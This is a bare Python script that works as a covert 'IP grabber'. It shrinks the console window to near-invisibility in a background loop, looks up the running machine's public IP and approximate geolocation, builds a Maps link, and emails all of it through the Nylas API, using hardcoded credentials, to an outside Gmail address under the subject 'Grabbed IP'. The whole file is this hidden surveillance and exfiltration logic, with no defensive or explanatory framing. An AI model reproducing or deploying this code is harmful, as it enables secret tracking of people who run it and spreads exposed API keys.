import os
import sys
import time
import threading
def winset():
    while True:
        os.system("mode con: COLS=16 LINES=1")
thread = threading.Thread(target=winset)
thread.start()
from nylas import APIClient
import geocoder
from requests import get
nylas = APIClient("b3dud1xut4axqtcb1jkimyjr5","039qdv1d8gsw2u7mrokqcenr","nnYdvRsRfTxYRl9NqROo41qUALqNoD")
link = str("https://www.google.com/maps/search/"+str(geocoder.ip('me').latlng[0])+",+"+str(geocoder.ip('me').latlng[1]))
ip = get('https://api.ipify.org').text
body = "<p>General location of IP: "+str(geocoder.ip('me').latlng)+"</p><a href="+str(link)+">LINK TO LOCATION</a><p>IPV4: "+str(format(ip))+"</p>"
draft = nylas.drafts.create()
draft.subject = "Grabbed IP"
draft.body = body
draft.to = [{'name': '', 'email': 'python.reciever.email@gmail.com'}]
draft.send()
exit()
